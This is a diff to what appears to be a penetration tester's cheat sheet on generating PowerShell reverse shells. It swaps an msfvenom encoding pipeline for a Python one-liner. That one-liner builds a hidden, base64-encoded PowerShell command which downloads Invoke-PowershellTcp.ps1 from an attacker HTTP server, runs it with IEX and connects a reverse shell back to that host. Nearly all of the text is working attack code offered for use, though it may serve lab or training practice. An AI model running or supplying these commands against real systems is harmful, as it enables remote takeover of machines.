@@ -28,9 +28,12 @@ msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.45.197 LPORT=4446 NOEXI
 ```
 > Important: Do not use the file but instead the powershell command it incorporates within a whole lot of gibberish
 
-Encode payload
-```bash
-msfvenom --payload $payload LHOST=$hip LPORT=$hport --format psh | msfvenom --payload - --platform win --arch x86 --encoder base64 NOEXIT SYSWOW64
+Base64 Encode payload
+```python
+python3 -c 'import base64,sys
+payload="IEX(New-Object System.Net.WebClient).DownloadString(\"http://192.168.45.232:8000/Invoke-PowershellTcp.ps1\"); Invoke-PowershellTcp -Reverse -IPAddress 192.168.45.232 -Port 4646"
+print("")
+print("powershell -nop -w hidden -e " + base64.b64encode(payload.encode("utf16")[2:]).decode())'
 ```
 
 # The manual way
